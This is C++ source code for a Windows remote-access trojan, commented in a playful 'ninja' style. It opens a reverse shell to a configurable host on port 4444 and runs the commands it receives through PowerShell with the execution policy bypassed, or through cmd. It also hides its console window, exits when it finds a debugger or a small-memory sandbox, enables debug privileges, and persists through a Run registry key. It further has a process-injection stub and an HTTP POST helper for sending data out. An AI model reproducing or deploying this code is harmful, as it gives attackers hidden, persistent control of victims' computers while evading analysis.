#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>

// Ancient ninja scroll containing socket combat techniques
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

#define BUFFER_SIZE 4096
#define ENCRYPTION_KEY "mysecretkey"

std::string encrypt(const std::string& data, const std::string& key) {
    std::string encrypted = data;
    for (size_t i = 0; i < data.size(); ++i) {
        encrypted[i] = data[i] ^ key[i % key.size()];
    }
    return encrypted;
}

std::string decrypt(const std::string& data, const std::string& key) {
    return encrypt(data, key);
}

// Secret ninja hand signs (forward declarations)
bool validate_command(const std::string& command);

void reverse_shell(const std::string& ip, int port) {
    SOCKET sock;
    struct sockaddr_in server;
    WSADATA wsaData;
    char buffer[BUFFER_SIZE];
    
    // Ninja quality control - checking if our throwing stars are properly balanced
    if (ip.empty() || port <= 0 || port > 65535) {
        std::cerr << "Invalid IP or port parameters." << std::endl;
        return;
    }
    
    std::string encrypted_ip = encrypt(ip, ENCRYPTION_KEY);
    std::string encrypted_port = encrypt(std::to_string(port), ENCRYPTION_KEY);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed." << std::endl;
            Sleep(5000);
            continue;
        }

        server.sin_addr.s_addr = inet_addr(decrypt(encrypted_ip, ENCRYPTION_KEY).c_str());
        server.sin_family = AF_INET;
        server.sin_port = htons(std::stoi(decrypt(encrypted_port, ENCRYPTION_KEY)));

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            std::cerr << "Connection failed. Retrying..." << std::endl;
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        std::cout << "Connected to " << ip << ":" << port << std::endl;

        while (true) {
            memset(buffer, 0, BUFFER_SIZE);
            int bytesReceived = recv(sock, buffer, BUFFER_SIZE - 1, 0);
            if (bytesReceived <= 0) {
                std::cerr << "Connection dropped. Reconnecting..." << std::endl;
                break;
            }
            buffer[bytesReceived] = '\0';
            std::string command = std::string(buffer);
            // Remove any trailing newlines or carriage returns
            command.erase(command.find_last_not_of("\r\n\t ") + 1);
            
            // Ninja code review - making sure no forbidden jutsu are being cast
            if (!validate_command(command)) {
                std::string errorMsg = "Command blocked for security reasons\n";
                send(sock, errorMsg.c_str(), errorMsg.size(), 0);
                continue;
            }
            
            // Summoning the command execution demon (safely contained in a scroll)
            std::string result;
            
            // Try PowerShell first, fallback to cmd if needed
            std::string powershell_command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
            FILE* pipe = _popen(powershell_command.c_str(), "r");
            
            if (!pipe) {
                // Fallback to cmd.exe if PowerShell fails
                std::string cmd_command = "cmd /c " + command;
                pipe = _popen(cmd_command.c_str(), "r");
            }
            
            if (pipe) {
                char tempBuffer[1024];
                while (fgets(tempBuffer, sizeof(tempBuffer), pipe) != NULL) {
                    result += tempBuffer;
                }
                _pclose(pipe);
                
                if (result.empty()) {
                    result = "Command executed successfully (no output)\n";
                }
            } else {
                result = "Failed to execute command: " + command + "\n";
            }
            
            // Send plain text result (no encryption for netcat compatibility)
            send(sock, result.c_str(), result.size(), 0);
        }

        closesocket(sock);
    }

    WSACleanup();
}

bool check_debugger() {
    return IsDebuggerPresent();
}

bool check_sandbox() {
    // Ninja reconnaissance - scouting for enemy training grounds (sandbox detection)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    
    // Ninja memory test - checking if we're in a tiny training dojo (sandbox)
    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        return true;
    }
    
    return false;
}

bool validate_command(const std::string& command) {
    // Ninja code of honor - blocking forbidden techniques that could harm the innocent
    std::vector<std::string> blocked_commands = {
        "format", "del", "delete", "rd", "rmdir", "shutdown", "restart",
        "remove-item", "ri", "rm", "rmdir", "format-volume", "stop-computer"
    };
    
    std::string lower_command = command;
    std::transform(lower_command.begin(), lower_command.end(), lower_command.begin(), ::tolower);
    
    for (const auto& blocked : blocked_commands) {
        if (lower_command.find(blocked) != std::string::npos) {
            return false;
        }
    }
    return true;
}

void inject_into_process(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return;
    
    // Carving out a secret compartment in the target's mind (memory allocation)
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuf) {
        CloseHandle(hProcess);
        return;
    }
    
    // Planting the forbidden scroll (placeholder for actual ninja techniques...I mean...shellco..forbidden scroll!)
    
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

void evade_analysis() {
    if (check_debugger()) {
        ExitProcess(0);
    }
    
    if (check_sandbox()) {
        ExitProcess(0);
    }
    
    // Ninja meditation time - making sandboxes fall asleep with our patience
    Sleep(5000);
}

void persist() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
        CloseHandle(hToken);
    }

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        if (GetModuleFileName(NULL, exePath, MAX_PATH) > 0) {
            RegSetValueEx(hKey, "ReverseShell", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        }
        RegCloseKey(hKey);
    }
}

void http_request(const std::string& url, const std::string& postData) {
    if (url.empty() || postData.empty()) {
        std::cerr << "Invalid URL or post data." << std::endl;
        return;
    }
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::cerr << "WinHttpOpen failed." << std::endl;
        return;
    }
    
    hConnect = WinHttpConnect(hSession, L"example.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        std::cerr << "WinHttpConnect failed." << std::endl;
        WinHttpCloseHandle(hSession);
        return;
    }
    
    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/path", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        std::cerr << "WinHttpOpenRequest failed." << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), postData.size(), postData.size(), 0)) {
        std::cerr << "WinHttpSendRequest failed." << std::endl;
    } else {
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            std::cerr << "WinHttpReceiveResponse failed." << std::endl;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    // Ninja vanishing technique - making the console disappear into the shadows
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Ninja stealth mode activation - vanishing from enemy radar before the mission
    evade_analysis();
    
    std::string ip = "192.168.0.1"; // Ninja headquarters coordinates (replace with your dojo)
    int port = 4444; // Secret knock pattern (replace with your clan's signal)

    persist();
    reverse_shell(ip, port);

    // Sending a carrier pigeon with encrypted scrolls (example HTTP request)
    std::string url = "http://example.com/path";
    std::string postData = "data=example";
    http_request(url, postData);
    
    return 0;

}
